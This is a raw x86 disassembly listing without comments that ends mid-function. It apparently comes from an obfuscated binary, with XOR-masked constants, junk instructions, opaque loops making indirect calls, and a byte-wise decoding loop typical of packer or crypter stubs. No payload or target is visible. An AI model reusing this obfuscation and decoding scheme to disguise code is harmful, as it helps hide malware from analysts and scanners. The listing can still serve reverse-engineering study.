  41ae9a:	add    DWORD PTR ds:0x42b000,0x42800c
  41aea4:	add    eax,0x3272db
  41aea9:	mov    DWORD PTR ds:0x42a014,0x169
  41aeb3:	mov    DWORD PTR [edx],eax
  41aeb5:	sbb    eax,edx
  41aeb7:	mov    eax,DWORD PTR [ebp+0xc]
  41aeba:	xor    eax,ecx
  41aebc:	inc    edx
  41aebd:	push   esi
  41aebe:	xor    esi,edx
  41aec0:	mov    esi,DWORD PTR [ebp+0x10]
  41aec3:	mov    edx,0x3272db
  41aec8:	add    eax,edx
  41aeca:	add    DWORD PTR ds:0x42b01c,0x428020
  41aed4:	mov    DWORD PTR [esi+0x4],eax
  41aed7:	mov    eax,DWORD PTR [ebp+0x14]
  41aeda:	mov    esi,DWORD PTR ds:0x428024
  41aee0:	sbb    esi,DWORD PTR ds:0x429010
  41aee6:	mov    DWORD PTR ds:0x428024,esi
  41aeec:	mov    esi,DWORD PTR [ebp+0x10]
  41aeef:	mov    DWORD PTR [esi+0x8],eax
  41aef2:	mov    eax,DWORD PTR [ebp+0x18]
  41aef5:	mov    esi,DWORD PTR [ebp+0x10]
  41aef8:	mov    DWORD PTR [esi+0xc],eax
  41aefb:	mov    eax,DWORD PTR [ebp+0x1c]
  41aefe:	mov    esi,DWORD PTR [ebp+0x10]
  41af01:	mov    DWORD PTR [esi+0x10],eax
  41af04:	mov    eax,DWORD PTR [ebp+0x8]
  41af07:	xor    eax,ecx
  41af09:	add    eax,edx
  41af0b:	pop    esi
  41af0c:	leave  
  41af0d:	ret    0x18
  41af10:	push   ebp
  41af11:	mov    ebp,esp
  41af13:	sub    esp,0x94
  41af19:	mov    eax,DWORD PTR [ebp+0x8]
  41af1c:	push   ebx
  41af1d:	neg    ecx
  41af1f:	push   esi
  41af20:	adc    esi,0x29b8
  41af26:	push   edi
  41af27:	or     edi,DWORD PTR ds:0x42b010
  41af2d:	mov    esi,0x7510893
  41af32:	or     ecx,ecx
  41af34:	xor    eax,esi
  41af36:	mov    edi,0x3272db
  41af3b:	add    eax,edi
  41af3d:	sub    DWORD PTR ds:0x42a018,0x772b
  41af47:	mov    DWORD PTR [ebp-0x38],eax
  41af4a:	mov    eax,ds:0x421ae6
  41af4f:	mov    ecx,DWORD PTR ds:0x428008
  41af55:	and    DWORD PTR ds:0x42b004,ecx
  41af5b:	mov    eax,DWORD PTR [eax]
  41af5d:	mov    DWORD PTR ds:0x42a01c,0x19
  41af67:	cmp    DWORD PTR ds:0x42a01c,0x0
  41af6e:	je     0x41afbe
  41af74:	cmp    DWORD PTR ds:0x42a01c,0x4
  41af7b:	jne    0x41af92
  41af81:	push   0x506a
  41af86:	push   DWORD PTR [ebp-0x24]
  41af89:	push   DWORD PTR [ebp-0x14]
  41af8c:	call   DWORD PTR ds:0x424028
  41af92:	cmp    DWORD PTR ds:0x42a01c,0x5
  41af99:	jne    0x41afac
  41af9f:	mov    ecx,DWORD PTR ds:0x42a01c
  41afa5:	dec    ecx
  41afa6:	mov    DWORD PTR ds:0x42a01c,ecx
  41afac:	mov    ecx,DWORD PTR ds:0x42a01c
  41afb2:	dec    ecx
  41afb3:	mov    DWORD PTR ds:0x42a01c,ecx
  41afb9:	jmp    0x41af67
  41afbe:	mov    DWORD PTR [ebp-0x24],eax
  41afc1:	add    DWORD PTR ds:0x428014,ecx
  41afc7:	mov    eax,ds:0x421cee
  41afcc:	mov    ecx,DWORD PTR ds:0x421a5e
  41afd2:	mov    ecx,DWORD PTR [ecx]
  41afd4:	adc    DWORD PTR ds:0x42a008,ecx
  41afda:	mov    eax,DWORD PTR [eax]
  41afdc:	and    DWORD PTR ds:0x42a01c,0x0
  41afe6:	jmp    0x41aff8
  41afeb:	mov    ecx,DWORD PTR ds:0x42a01c
  41aff1:	inc    ecx
  41aff2:	mov    DWORD PTR ds:0x42a01c,ecx
  41aff8:	cmp    DWORD PTR ds:0x42a01c,0x10
  41afff:	jae    0x41b0fe
  41b005:	cmp    DWORD PTR ds:0x42a01c,0x8
  41b00c:	jne    0x41b022
  41b012:	push   0x4238a2
  41b017:	push   0x423822
  41b01c:	call   DWORD PTR ds:0x424030
  41b022:	cmp    DWORD PTR ds:0x42a01c,0x7
  41b029:	jne    0x41b03e
  41b02f:	xor    ecx,ecx
  41b031:	xor    ecx,DWORD PTR ds:0x42a01c
  41b037:	inc    ecx
  41b038:	mov    DWORD PTR ds:0x42a01c,ecx
  41b03e:	jmp    0x41afeb
  41b043:	and    DWORD PTR ds:0x42901c,0x0
  41b04d:	jmp    0x41b05f
  41b052:	mov    ecx,DWORD PTR ds:0x42901c
  41b058:	inc    ecx
  41b059:	mov    DWORD PTR ds:0x42901c,ecx
  41b05f:	cmp    DWORD PTR ds:0x42901c,0x11
  41b066:	jae    0x41b0fe
  41b06c:	cmp    DWORD PTR ds:0x42901c,0x7
  41b073:	jne    0x41b099
  41b079:	push   DWORD PTR [ebp-0x10]
  41b07c:	push   DWORD PTR [ebp-0x18]
  41b07f:	push   0x2cae
  41b084:	push   0x19d0
  41b089:	push   0x7b35
  41b08e:	push   0x42c01c
  41b093:	call   DWORD PTR ds:0x424038
  41b099:	cmp    DWORD PTR ds:0x42901c,0x6
  41b0a0:	jne    0x41b0b3
  41b0a6:	mov    ecx,DWORD PTR ds:0x42901c
  41b0ac:	inc    ecx
  41b0ad:	mov    DWORD PTR ds:0x42901c,ecx
  41b0b3:	jmp    0x41b052
  41b0b8:	mov    DWORD PTR ds:0x42c00c,0x11
  41b0c2:	cmp    DWORD PTR ds:0x42c00c,0x0
  41b0c9:	je     0x41b0fe
  41b0cf:	cmp    DWORD PTR ds:0x42c00c,0x18
  41b0d6:	jne    0x41b0ec
  41b0dc:	push   0x42a008
  41b0e1:	push   0x6229
  41b0e6:	call   DWORD PTR ds:0x42403c
  41b0ec:	mov    ecx,DWORD PTR ds:0x42c00c
  41b0f2:	dec    ecx
  41b0f3:	mov    DWORD PTR ds:0x42c00c,ecx
  41b0f9:	jmp    0x41b0c2
  41b0fe:	mov    DWORD PTR [ebp-0x28],eax
  41b101:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  41b108:	mov    eax,DWORD PTR [ebp-0x34]
  41b10b:	xor    eax,esi
  41b10d:	add    eax,edi
  41b10f:	sbb    DWORD PTR ds:0x42a000,0x3656
  41b119:	mov    DWORD PTR [ebp-0x38],eax
  41b11c:	mov    eax,ds:0x421c66
  41b121:	mov    DWORD PTR [ebp-0x38],eax
  41b124:	or     eax,0x6382
  41b129:	mov    eax,DWORD PTR [ebp-0x24]
  41b12c:	and    DWORD PTR ds:0x42a008,0x0
  41b136:	mov    ecx,DWORD PTR ds:0x42a008
  41b13c:	inc    ecx
  41b13d:	mov    DWORD PTR ds:0x42a008,ecx
  41b143:	cmp    DWORD PTR ds:0x42a008,0x9
  41b14a:	jne    0x41b15e
  41b150:	push   DWORD PTR [ebp-0x14]
  41b153:	push   0x4237fd
  41b158:	call   DWORD PTR ds:0x424040
  41b15e:	cmp    DWORD PTR ds:0x42a008,0x8
  41b165:	jne    0x41b17a
  41b16b:	xor    ecx,ecx
  41b16d:	add    ecx,DWORD PTR ds:0x42a008
  41b173:	inc    ecx
  41b174:	mov    DWORD PTR ds:0x42a008,ecx
  41b17a:	cmp    DWORD PTR ds:0x42a008,0x17
  41b181:	jb     0x41b136
  41b187:	mov    DWORD PTR [ebp-0x14],eax
  41b18a:	mov    eax,DWORD PTR [ebp-0x14]
  41b18d:	dec    DWORD PTR ds:0x42c000
  41b193:	push   0x4
  41b195:	and    ecx,DWORD PTR ds:0x42a018
  41b19b:	pop    ecx
  41b19c:	sbb    DWORD PTR ds:0x42b000,0x429004
  41b1a6:	sub    ecx,eax
  41b1a8:	xor    DWORD PTR ds:0x42a01c,0x102e
  41b1b2:	add    ecx,DWORD PTR [ebp-0x28]
  41b1b5:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41b1bc:	adc    eax,0x5aaa
  41b1c1:	mov    DWORD PTR [ebp-0x20],ecx
  41b1c4:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  41b1ce:	and    DWORD PTR ds:0x428010,0x0
  41b1d8:	jmp    0x41b1eb
  41b1dd:	xor    eax,eax
  41b1df:	add    eax,DWORD PTR ds:0x428010
  41b1e5:	inc    eax
  41b1e6:	mov    ds:0x428010,eax
  41b1eb:	cmp    DWORD PTR ds:0x428010,0x10
  41b1f2:	jae    0x41b22d
  41b1f8:	cmp    DWORD PTR ds:0x428010,0x9
  41b1ff:	jne    0x41b210
  41b205:	push   0x423814
  41b20a:	call   DWORD PTR ds:0x424044
  41b210:	cmp    DWORD PTR ds:0x428010,0x8
  41b217:	jne    0x41b228
  41b21d:	mov    eax,ds:0x428010
  41b222:	inc    eax
  41b223:	mov    ds:0x428010,eax
  41b228:	jmp    0x41b1dd
  41b22d:	mov    eax,DWORD PTR [ebp-0x14]
  41b230:	sbb    DWORD PTR ds:0x42a018,0x429014
  41b23a:	mov    DWORD PTR [ebp-0x90],eax
  41b240:	dec    eax
  41b241:	mov    eax,DWORD PTR [ebp-0x20]
  41b244:	mov    DWORD PTR [ebp-0x8c],eax
  41b24a:	add    DWORD PTR ds:0x42c00c,0x20f
  41b254:	mov    eax,DWORD PTR [ebp-0x2c]
  41b257:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  41b261:	xor    eax,esi
  41b263:	add    eax,edi
  41b265:	mov    DWORD PTR [ebp-0x88],eax
  41b26b:	lea    eax,[ebp-0x50]
  41b26e:	or     DWORD PTR ds:0x42b014,0x1a32
  41b278:	mov    DWORD PTR [ebp-0x84],eax
  41b27e:	mov    eax,DWORD PTR [ebp-0x94]
  41b284:	xor    DWORD PTR ds:0x42b010,0x42a00c
  41b28e:	xor    eax,esi
  41b290:	xor    DWORD PTR ds:0x42900c,0x429018
  41b29a:	add    eax,edi
  41b29c:	and    DWORD PTR ds:0x428020,0x42c01c
  41b2a6:	mov    DWORD PTR [ebp-0x94],eax
  41b2ac:	and    DWORD PTR ds:0x42a000,0x429010
  41b2b6:	lea    eax,[ebp-0x94]
  41b2bc:	adc    DWORD PTR ds:0x42b018,0x42c018
  41b2c6:	push   eax
  41b2c7:	movzx  eax,WORD PTR ds:0x42b01c
  41b2ce:	add    DWORD PTR ds:0x42a008,eax
  41b2d4:	mov    eax,DWORD PTR [ebp+0xc]
  41b2d7:	xor    eax,esi
  41b2d9:	add    DWORD PTR ds:0x428028,0x2102
  41b2e3:	add    eax,edi
  41b2e5:	sub    DWORD PTR ds:0x429010,0x36a
  41b2ef:	push   eax
  41b2f0:	mov    eax,ds:0x421c86
  41b2f5:	adc    DWORD PTR ds:0x428024,0x6674
  41b2ff:	push   0x421bdc
  41b304:	and    DWORD PTR ds:0x42a014,0x6ed
  41b30e:	push   DWORD PTR [eax]
  41b310:	add    DWORD PTR ds:0x42a000,0x42900c
  41b31a:	call   0x405c89
  41b31f:	or     eax,DWORD PTR ds:0x42901c
  41b325:	mov    eax,DWORD PTR [ebp-0x14]
  41b328:	and    ecx,0x4079
  41b32e:	mov    ecx,DWORD PTR [ebp-0x20]
  41b331:	sub    DWORD PTR ds:0x42b01c,0xab5
  41b33b:	mov    DWORD PTR [ebp-0x44],ecx
  41b33e:	sbb    DWORD PTR ds:0x42b01c,edi
  41b344:	mov    ecx,DWORD PTR [ebp+0x8]
  41b347:	xor    ecx,esi
  41b349:	add    DWORD PTR ds:0x42a018,0x42a000
  41b353:	mov    DWORD PTR [ebp-0x34],eax
  41b356:	add    ecx,edi
  41b358:	jmp    0x41b6c6
  41b35d:	sub    DWORD PTR ds:0x42a018,edi
  41b363:	lea    edx,[ecx+eax*1]
  41b366:	mov    DWORD PTR [ebp-0x28],edx
  41b369:	mov    edx,DWORD PTR [ebp-0x44]
  41b36c:	mov    ebx,DWORD PTR ds:0x429004
  41b372:	add    DWORD PTR ds:0x42c008,ebx
  41b378:	sub    edx,ecx
  41b37a:	mov    DWORD PTR ds:0x42b004,0x1e
  41b384:	cmp    DWORD PTR ds:0x42b004,0x0
  41b38b:	je     0x41b3c5
  41b391:	cmp    DWORD PTR ds:0x42b004,0x28
  41b398:	jne    0x41b3b3
  41b39e:	push   0x3a6a
  41b3a3:	push   0x42b010
  41b3a8:	push   0x423972
  41b3ad:	call   DWORD PTR ds:0x424048
  41b3b3:	mov    ebx,DWORD PTR ds:0x42b004
  41b3b9:	dec    ebx
  41b3ba:	mov    DWORD PTR ds:0x42b004,ebx
  41b3c0:	jmp    0x41b384
  41b3c5:	mov    DWORD PTR [ebp-0x24],edx
  41b3c8:	mov    edx,DWORD PTR [ebp-0x24]
  41b3cb:	and    DWORD PTR ds:0x428008,edi
  41b3d1:	mov    DWORD PTR [ebp-0x14],edx
  41b3d4:	not    edx
  41b3d6:	mov    edx,DWORD PTR [ebp-0x28]
  41b3d9:	mov    DWORD PTR ds:0x42800c,0x11
  41b3e3:	cmp    DWORD PTR ds:0x42800c,0x0
  41b3ea:	je     0x41b499
  41b3f0:	cmp    DWORD PTR ds:0x42800c,0x8
  41b3f7:	jne    0x41b40b
  41b3fd:	push   0x42a010
  41b402:	push   DWORD PTR [ebp-0x28]
  41b405:	call   DWORD PTR ds:0x424014
  41b40b:	cmp    DWORD PTR ds:0x42800c,0x9
  41b412:	jne    0x41b425
  41b418:	mov    ebx,DWORD PTR ds:0x42800c
  41b41e:	dec    ebx
  41b41f:	mov    DWORD PTR ds:0x42800c,ebx
  41b425:	xor    ebx,ebx
  41b427:	or     ebx,DWORD PTR ds:0x42800c
  41b42d:	dec    ebx
  41b42e:	mov    DWORD PTR ds:0x42800c,ebx
  41b434:	jmp    0x41b3e3
  41b439:	mov    DWORD PTR ds:0x429004,0x17
  41b443:	cmp    DWORD PTR ds:0x429004,0x0
  41b44a:	je     0x41b499
  41b450:	cmp    DWORD PTR ds:0x429004,0x25
  41b457:	jne    0x41b485
  41b45d:	push   0x85b6
  41b462:	push   0x42a018
  41b467:	push   DWORD PTR [ebp-0x24]
  41b46a:	push   0x42c000
  41b46f:	push   0x5138
  41b474:	push   DWORD PTR [ebp-0x24]
  41b477:	push   0x4b55
  41b47c:	push   DWORD PTR [ebp-0x24]
  41b47f:	call   DWORD PTR ds:0x424018
  41b485:	xor    ebx,ebx
  41b487:	add    ebx,DWORD PTR ds:0x429004
  41b48d:	dec    ebx
  41b48e:	mov    DWORD PTR ds:0x429004,ebx
  41b494:	jmp    0x41b443
  41b499:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  41b4a0:	mov    DWORD PTR [ebp-0x40],edx
  41b4a3:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41b4aa:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4ad:	xor    edx,esi
  41b4af:	add    edx,edi
  41b4b1:	mov    DWORD PTR [ebp-0x10],edx
  41b4b4:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4b7:	xor    edx,esi
  41b4b9:	add    edx,edi
  41b4bb:	mov    DWORD PTR [ebp-0x8],edx
  41b4be:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41b4c5:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41b4cc:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4cf:	mov    ebx,DWORD PTR [ebp-0x14]
  41b4d2:	xor    edx,esi
  41b4d4:	add    edx,edi
  41b4d6:	cmp    ebx,edx
  41b4d8:	je     0x41b6ba
  41b4de:	mov    eax,DWORD PTR [ebp-0x18]
  41b4e1:	xor    eax,esi
  41b4e3:	mov    edx,0xffcd8d25
  41b4e8:	sub    edx,eax
  41b4ea:	add    edx,DWORD PTR [ebp-0x14]
  41b4ed:	mov    eax,DWORD PTR [ebp-0x18]
  41b4f0:	mov    ebx,DWORD PTR [ebp-0x10]
  41b4f3:	xor    eax,esi
  41b4f5:	add    eax,edi
  41b4f7:	imul   eax,ebx
  41b4fa:	cmp    eax,edx
  41b4fc:	ja     0x41b6b7
  41b502:	mov    edx,DWORD PTR [ebp-0x10]
  41b505:	mov    eax,DWORD PTR [ebp-0x14]
  41b508:	mov    ebx,DWORD PTR [ebp-0x28]
  41b50b:	sub    eax,edx
  41b50d:	xor    ebx,esi
  41b50f:	xor    edx,edx
  41b511:	add    ebx,edi
  41b513:	div    ebx
  41b515:	mov    DWORD PTR [ebp-0x8],eax
  41b518:	mov    eax,DWORD PTR [ebp-0x2c]
  41b51b:	mov    edx,DWORD PTR [ebp-0x8]
  41b51e:	xor    eax,esi
  41b520:	add    eax,edi
  41b522:	cmp    edx,eax
  41b524:	jbe    0x41b534
  41b52a:	mov    eax,DWORD PTR [ebp-0x2c]
  41b52d:	xor    eax,esi
  41b52f:	add    eax,edi
  41b531:	mov    DWORD PTR [ebp-0x8],eax
  41b534:	mov    eax,DWORD PTR [ebp-0x28]
  41b537:	mov    edx,DWORD PTR [ebp-0x8]
  41b53a:	xor    eax,esi
  41b53c:	add    eax,edi
  41b53e:	imul   eax,edx
  41b541:	mov    DWORD PTR [ebp-0x8],eax
  41b544:	mov    eax,DWORD PTR [ebp-0x3c]
  41b547:	mov    edx,DWORD PTR [ebp-0x8]
  41b54a:	xor    eax,esi
  41b54c:	add    eax,edi
  41b54e:	cmp    edx,eax
  41b550:	je     0x41b6a0
  41b556:	mov    eax,DWORD PTR [ebp-0x8]
  41b559:	mov    DWORD PTR [ebp-0x20],eax
  41b55c:	mov    eax,DWORD PTR [ebp-0x10]
  41b55f:	add    eax,DWORD PTR [ebp-0x40]
  41b562:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  41b569:	mov    DWORD PTR [ebp-0x8],eax
  41b56c:	mov    eax,0xf89c85b5
  41b571:	mov    DWORD PTR [ebp-0x1c],eax
  41b574:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  41b57b:	mov    DWORD PTR [ebp-0x30],eax
  41b57e:	mov    eax,DWORD PTR [ebp-0x24]
  41b581:	xor    eax,esi
  41b583:	add    eax,edi
  41b585:	jmp    0x41b654
  41b58a:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41b591:	mov    DWORD PTR [ebp-0x4c],0xf89c85a7
  41b598:	mov    eax,DWORD PTR [ebp-0x30]
  41b59b:	mov    edx,DWORD PTR [ebp-0xc]
  41b59e:	xor    eax,esi
  41b5a0:	add    eax,edi
  41b5a2:	imul   eax,edx
  41b5a5:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5a8:	xor    edx,esi
  41b5aa:	add    eax,edx
  41b5ac:	mov    edx,DWORD PTR [ebp-0x8]
  41b5af:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  41b5b6:	mov    BYTE PTR [ebp-0x1],al
  41b5b9:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5bf:	xor    eax,esi
  41b5c1:	xor    edx,esi
  41b5c3:	lea    ebx,[eax+edx*1+0x64e5b6]
  41b5ca:	mov    eax,DWORD PTR [ebp-0xc]
  41b5cd:	xor    edx,edx
  41b5cf:	div    ebx
  41b5d1:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5d4:	xor    eax,esi
  41b5d6:	add    eax,edi
  41b5d8:	cmp    edx,eax
  41b5da:	mov    eax,DWORD PTR [ebp-0x30]
  41b5dd:	mov    edx,DWORD PTR [ebp-0xc]
  41b5e0:	jne    0x41b5fc
  41b5e6:	xor    eax,esi
  41b5e8:	add    eax,edi
  41b5ea:	imul   eax,edx
  41b5ed:	mov    edx,DWORD PTR [ebp-0x8]
  41b5f0:	movzx  eax,BYTE PTR [eax+edx*1]
  41b5f4:	mov    edx,DWORD PTR [ebp-0x48]
  41b5f7:	jmp    0x41b60d
  41b5fc:	xor    eax,esi
  41b5fe:	add    eax,edi
  41b600:	imul   eax,edx
  41b603:	mov    edx,DWORD PTR [ebp-0x8]
  41b606:	movzx  eax,BYTE PTR [eax+edx*1]
  41b60a:	mov    edx,DWORD PTR [ebp-0x4c]
  41b60d:	xor    edx,esi
  41b60f:	lea    eax,[edx+eax*1+0x3272db]
  41b616:	movzx  edx,BYTE PTR [ebp-0x1]
  41b61a:	xor    edx,eax
  41b61c:	mov    BYTE PTR [ebp-0x1],dl
  41b61f:	mov    al,BYTE PTR [ebp-0x1]
  41b622:	mov    edx,DWORD PTR [ebp-0x30]
  41b625:	mov    ebx,DWORD PTR [ebp-0xc]
  41b628:	xor    edx,esi
  41b62a:	add    edx,edi
  41b62c:	imul   edx,ebx
  41b62f:	mov    ebx,DWORD PTR [ebp-0x1c]
  41b632:	xor    ebx,esi
  41b634:	add    edx,ebx
  41b636:	mov    ebx,DWORD PTR [ebp-0x8]
  41b639:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  41b640:	mov    eax,DWORD PTR [ebp-0x38]
  41b643:	mov    edx,DWORD PTR [ebp-0x1c]
  41b646:	xor    eax,esi
  41b648:	xor    edx,esi
  41b64a:	add    eax,edi
  41b64c:	add    edx,edi
  41b64e:	imul   eax,edx
  41b651:	add    eax,DWORD PTR [ebp-0xc]
  41b654:	mov    DWORD PTR [ebp-0xc],eax
  41b657:	mov    eax,DWORD PTR [ebp-0xc]
  41b65a:	mov    edx,DWORD PTR [ebp-0x20]
  41b65d:	sub    eax,edi
  41b65f:	sub    edx,edi
  41b661:	xor    eax,esi
  41b663:	xor    edx,esi
  41b665:	cmp    edx,eax
  41b667:	jne    0x41b58a
  41b66d:	mov    eax,DWORD PTR [ebp-0x1c]
  41b670:	mov    edx,DWORD PTR [ebp-0x20]
  41b673:	xor    eax,esi
  41b675:	add    eax,edi
  41b677:	imul   eax,edx
  41b67a:	mov    edx,DWORD PTR [ebp-0x24]
  41b67d:	xor    edx,esi
  41b67f:	add    edx,edi
  41b681:	or     eax,edx
  41b683:	mov    edx,DWORD PTR [ebp-0x18]
  41b686:	xor    edx,esi
  41b688:	add    eax,edx
  41b68a:	mov    edx,DWORD PTR [ebp-0x18]
  41b68d:	xor    edx,esi
  41b68f:	add    eax,edx
  41b691:	mov    edx,DWORD PTR [ebp-0x10]
  41b694:	lea    eax,[eax+edx*1+0x64e5b6]
  41b69b:	jmp    0x41b6af
  41b6a0:	mov    eax,DWORD PTR [ebp-0x18]
  41b6a3:	mov    edx,DWORD PTR [ebp-0x10]
  41b6a6:	xor    eax,esi
  41b6a8:	lea    eax,[eax+edx*1+0x3272db]
  41b6af:	mov    DWORD PTR [ebp-0x10],eax
  41b6b2:	jmp    0x41b4de
  41b6b7:	mov    eax,DWORD PTR [ebp-0x34]
  41b6ba:	mov    edx,DWORD PTR [ebp+0xc]
  41b6bd:	xor    edx,esi
  41b6bf:	lea    ecx,[ecx+edx*1+0x3272db]
  41b6c6:	lea    edx,[ecx-0x3272db]
  41b6cc:	xor    edx,esi
  41b6ce:	cmp    edx,0xf89c95b6
  41b6d4:	jne    0x41b35d
  41b6da:	mov    ecx,DWORD PTR [ebp+0x8]
  41b6dd:	mov    edx,DWORD PTR [ebp+0xc]
  41b6e0:	mov    ebx,DWORD PTR [ebp+0x8]
  41b6e3:	xor    edx,esi
  41b6e5:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  41b6ec:	xor    ecx,esi
  41b6ee:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41b6f5:	xor    ebx,esi
  41b6f7:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  41b6fe:	mov    edx,DWORD PTR [ebp+0xc]
  41b701:	xor    edx,esi
  41b703:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  41b70a:	mov    eax,DWORD PTR [ebp+0xc]
  41b70d:	xor    eax,esi
  41b70f:	add    eax,edi
  41b711:	pop    edi
  41b712:	pop    esi
  41b713:	pop    ebx
  41b714:	leave  
  41b715:	ret    0x8
  41b718:	push   ebp
  41b719:	mov    ebp,esp
  41b71b:	mov    DWORD PTR ds:0x421d76,0xf89c85b5
  41b725:	pop    ebp
  41b726:	jmp    0x41b89a
  41b72b:	push   ebp
  41b72c:	mov    ebp,esp
  41b72e:	push   ecx
  41b72f:	and    DWORD PTR ds:0x42c010,0x0
  41b739:	jmp    0x41b74b
  41b73e:	mov    edx,DWORD PTR ds:0x42c010
  41b744:	inc    edx
  41b745:	mov    DWORD PTR ds:0x42c010,edx
  41b74b:	cmp    DWORD PTR ds:0x42c010,0x19
  41b752:	jae    0x41b793
  41b758:	cmp    DWORD PTR ds:0x42c010,0x9
  41b75f:	jne    0x41b76e
  41b765:	push   DWORD PTR [ebp-0x18]
  41b768:	call   DWORD PTR ds:0x42401c
  41b76e:	cmp    DWORD PTR ds:0x42c010,0x8
  41b775:	jne    0x41b788
  41b77b:	mov    edx,DWORD PTR ds:0x42c010
  41b781:	inc    edx
  41b782:	mov    DWORD PTR ds:0x42c010,edx
  41b788:	jmp    0x41b73e
  41b78d:	or     DWORD PTR ds:0x42c004,ebx
  41b793:	push   ecx
  41b794:	movzx  eax,BYTE PTR ds:0x42b00c
  41b79b:	and    DWORD PTR ds:0x42a01c,eax
  41b7a1:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  41b7a8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41b7af:	mov    DWORD PTR ds:0x428008,0x13
  41b7b9:	cmp    DWORD PTR ds:0x428008,0x0
  41b7c0:	je     0x41b7ef
  41b7c6:	cmp    DWORD PTR ds:0x428008,0x20
  41b7cd:	jne    0x41b7df
  41b7d3:	push   DWORD PTR [ebp-0x14]
  41b7d6:	push   DWORD PTR [ebp-0x1c]
  41b7d9:	call   DWORD PTR ds:0x424020
  41b7df:	mov    eax,ds:0x428008
  41b7e4:	dec    eax
  41b7e5:	mov    ds:0x428008,eax
  41b7ea:	jmp    0x41b7b9
  41b7ef:	mov    eax,DWORD PTR [ebp-0x4]
  41b7f2:	and    DWORD PTR ds:0x429008,0x428020
  41b7fc:	push   esi
  41b7fd:	adc    DWORD PTR ds:0x42c000,0x1310
  41b807:	mov    esi,DWORD PTR [ebp-0x8]
  41b80a:	mov    edx,0x7510893
  41b80f:	xor    eax,edx
  41b811:	mov    ecx,DWORD PTR ds:0x42a000
  41b817:	and    DWORD PTR ds:0x429014,ecx
  41b81d:	xor    esi,edx
  41b81f:	mov    ecx,DWORD PTR ds:0x423ac1
  41b825:	mov    ecx,DWORD PTR [ecx]
  41b827:	sbb    DWORD PTR ds:0x42b00c,ecx
  41b82d:	mov    ecx,0x3272db
  41b832:	add    esi,ecx
  41b834:	add    eax,ecx
  41b836:	imul   eax,esi
  41b839:	mov    esi,DWORD PTR [ebp+0xc]
  41b83c:	cmp    esi,eax
  41b83e:	jne    0x41b85a
  41b844:	mov    eax,DWORD PTR [ebp-0x4]
  41b847:	mov    esi,DWORD PTR [ebp-0x8]
  41b84a:	xor    eax,edx
  41b84c:	xor    esi,edx
  41b84e:	add    eax,ecx
  41b850:	add    esi,ecx
  41b852:	imul   eax,esi
  41b855:	jmp    0x41b895
  41b85a:	mov    eax,DWORD PTR [ebp+0xc]
  41b85d:	mov    eax,DWORD PTR [eax+0x78]
  41b860:	mov    DWORD PTR [ebp+0xc],eax
  41b863:	mov    eax,DWORD PTR [ebp-0x4]
  41b866:	mov    esi,DWORD PTR [ebp-0x8]
  41b869:	xor    eax,edx
  41b86b:	xor    esi,edx
  41b86d:	add    eax,ecx
  41b86f:	add    esi,ecx
  41b871:	imul   eax,esi
  41b874:	mov    esi,DWORD PTR [ebp+0xc]
  41b877:	cmp    esi,eax
  41b879:	mov    eax,DWORD PTR [ebp-0x4]
  41b87c:	je     0x41b847
  41b882:	xor    eax,edx
  41b884:	add    eax,ecx
  41b886:	mov    ecx,DWORD PTR [ebp+0xc]
  41b889:	imul   eax,ecx
  41b88c:	add    eax,DWORD PTR [ebp+0x8]
  41b88f:	mov    DWORD PTR [ebp+0xc],eax
  41b892:	mov    eax,DWORD PTR [ebp+0xc]
  41b895:	pop    esi
  41b896:	leave  
  41b897:	ret    0x8
  41b89a:	push   ebp
  41b89b:	mov    ebp,esp
  41b89d:	sub    esp,0x80
  41b8a3:	push   ebx
  41b8a4:	push   esi
  41b8a5:	push   edi
  41b8a6:	mov    DWORD PTR ds:0x42c010,0xf9a
  41b8b0:	mov    DWORD PTR [ebp-0x3c],0x0
  41b8b7:	dec    eax
  41b8b8:	mov    eax,DWORD PTR [ebp-0x18]
  41b8bb:	mov    DWORD PTR [ebp-0x18],eax
  41b8be:	adc    DWORD PTR ds:0x429014,0x42801c
  41b8c8:	push   0x421d7a
  41b8cd:	call   DWORD PTR ds:0x42402c
  41b8d3:	adc    DWORD PTR ds:0x428018,0x3fb
  41b8dd:	push   0x0
  41b8df:	push   0x67
  41b8e1:	sbb    DWORD PTR ds:0x42b008,0x4024
  41b8eb:	push   0xc
  41b8ed:	mov    DWORD PTR ds:0x429000,0x5718
  41b8f7:	push   0x3
  41b8f9:	and    DWORD PTR ds:0x42b004,0x67ab
  41b903:	push   0x2
  41b905:	push   0x78769798
  41b90a:	or     DWORD PTR ds:0x428024,0x42c014
  41b914:	call   DWORD PTR ds:0x42400c
  41b91a:	or     DWORD PTR ds:0x42c000,0x429014
  41b924:	push   0x57658733
  41b929:	and    DWORD PTR ds:0x42c000,0x42900c
  41b933:	call   DWORD PTR ds:0x424008
  41b939:	push   0x97667654
  41b93e:	call   DWORD PTR ds:0x424000
  41b944:	movzx  eax,BYTE PTR ds:0x428004
  41b94b:	mov    eax,DWORD PTR [ebp-0x18]
  41b94e:	cmp    eax,0xf89c85b6
  41b953:	mov    DWORD PTR ds:0x42c018,0x6f46
  41b95d:	jne    0x41ba3b
  41b963:	sub    DWORD PTR ds:0x42b018,0x42901c
  41b96d:	xor    edi,edi
  41b96f:	inc    edi
  41b970:	xor    esi,esi
  41b972:	inc    esi
